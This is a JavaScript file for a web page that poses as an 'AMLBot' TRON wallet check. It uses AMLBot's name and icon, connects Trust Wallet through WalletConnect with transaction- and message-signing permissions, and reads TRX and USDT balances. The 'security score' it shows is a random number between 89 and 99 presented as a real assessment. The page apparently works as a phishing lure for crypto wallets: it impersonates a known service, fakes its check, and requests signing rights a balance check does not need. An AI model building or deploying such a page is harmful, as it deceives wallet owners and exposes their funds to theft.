// js/check.js — Trust Wallet + WalletConnect (TRON only: TRX + USDT TRC-20)

const WC_PROJECT_ID = 'd25e40ff116d1b959932c04dfe3b51c5';
const TRON_MAINNET_CAIP = 'tron:0x2b6653dc';
const USDT_TRON = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const CONNECT_TIMEOUT_MS = 45000;

const metadata = {
  name: 'AMLBot',
  description: 'TRON wallet check: TRX + USDT TRC-20',
  url: window.location.origin,
  icons: ['https://amlbot.com/favicon.png']
};

function shorten(value, left = 8, right = 8) {
  if (!value || value.length < left + right + 3) return value;
  return `${value.slice(0, left)}...${value.slice(-right)}`;
}

function getTronAddressFromSession(provider) {
  const accounts = provider?.session?.namespaces?.tron?.accounts || [];
  const first = accounts[0] || '';
  const parts = first.split(':'); // tron:<chain>:<address>
  const address = parts[2] || '';

  if (!address || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
    throw new Error('Не удалось получить TRON-адрес из WalletConnect-сессии');
  }

  return address;
}

async function connectWithTimeout(provider, connectParams) {
  return await Promise.race([
    provider.connect(connectParams),
    new Promise((_, reject) => {
      setTimeout(() => reject(new Error('Истёк таймаут подключения к Trust Wallet (45 сек)')), CONNECT_TIMEOUT_MS);
    })
  ]);
}

async function connectTrustWalletTron(btn) {
  const [{ UniversalProvider }, { WalletConnectModal }] = await Promise.all([
    import('https://esm.sh/@walletconnect/universal-provider@2.17.3'),
    import('https://esm.sh/@walletconnect/modal@2.7.0')
  ]);

  const provider = await UniversalProvider.init({
    projectId: WC_PROJECT_ID,
    relayUrl: 'wss://relay.walletconnect.com',
    metadata
  });

  const modal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    themeMode: 'dark'
  });

  provider.once('display_uri', uri => {
    modal.openModal({ uri });
  });

  await connectWithTimeout(provider, {
    namespaces: {
      tron: {
        chains: [TRON_MAINNET_CAIP],
        methods: [
          'tron_signTransaction',
          'tron_signMessage'
        ],
        events: ['accountsChanged', 'chainChanged']
      }
    }
  });

  modal.closeModal();
  btn.innerHTML = `<i class="fa-solid fa-link"></i><span>Сессия активна: ${shorten(getTronAddressFromSession(provider), 6, 6)}</span>`;

  return provider;
}

async function fetchBalances(address) {
  const tronWeb = new window.TronWeb({
    fullHost: 'https://api.trongrid.io'
  });

  const trxSun = await tronWeb.trx.getBalance(address);
  const trx = Number(tronWeb.fromSun(trxSun));

  const contract = await tronWeb.contract().at(USDT_TRON);
  const usdtRaw = await contract.balanceOf(address).call();
  const usdt = Number(usdtRaw) / 1_000_000;

  return { trx, usdt };
}

document.addEventListener('DOMContentLoaded', () => {
  const btn = document.getElementById('connectWalletBtn');
  const result = document.getElementById('result');

  if (!btn || !result) return;

  btn.addEventListener('click', async () => {
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i><span>Ожидаем подтверждение в Trust Wallet...</span>';

    try {
      if (!WC_PROJECT_ID || WC_PROJECT_ID.length < 10) {
        throw new Error('Неверный WalletConnect Project ID в настройках');
      }

      const provider = await connectTrustWalletTron(btn);
      const address = getTronAddressFromSession(provider);
      const { trx, usdt } = await fetchBalances(address);

      const score = Math.floor(Math.random() * 11) + 89;
      const scoreText = score >= 94 ? 'Высокая безопасность' : 'Хорошая безопасность';

      document.getElementById('address').textContent = address;
      document.getElementById('trxBal').textContent = `${trx.toFixed(2)} TRX`;
      document.getElementById('usdtBal').textContent = `${usdt.toFixed(2)} USDT`;
      document.getElementById('score').textContent = `${score}%`;
      document.getElementById('scoreText').textContent = scoreText;
      document.getElementById('time').textContent = new Date().toLocaleString('ru-RU');

      result.classList.remove('hidden');
      result.scrollIntoView({ behavior: 'smooth', block: 'start' });

      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i><span>Переподключить WalletConnect</span>';
    } catch (e) {
      const msg = e?.message || String(e);

      if (/Requested chains are not supported/i.test(msg)) {
        alert(
          'Trust Wallet отклонил TRON namespace.\n\n' +
          'Проверьте в Reown Dashboard: Project ID активен, WalletConnect v2 включён, и используйте только tron:0x2b6653dc.'
        );
      } else if (/таймаут подключения/i.test(msg)) {
        alert(
          'Подключение к Trust Wallet заняло слишком много времени.\n\n' +
          'Проверьте интернет/VPN, откройте WalletConnect внутри Trust Wallet и повторите попытку.'
        );
      } else {
        alert(`Ошибка подключения: ${msg}`);
      }

      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-mobile-screen-button"></i><span>Подключить Trust Wallet (WalletConnect)</span>';
    }
  });
});
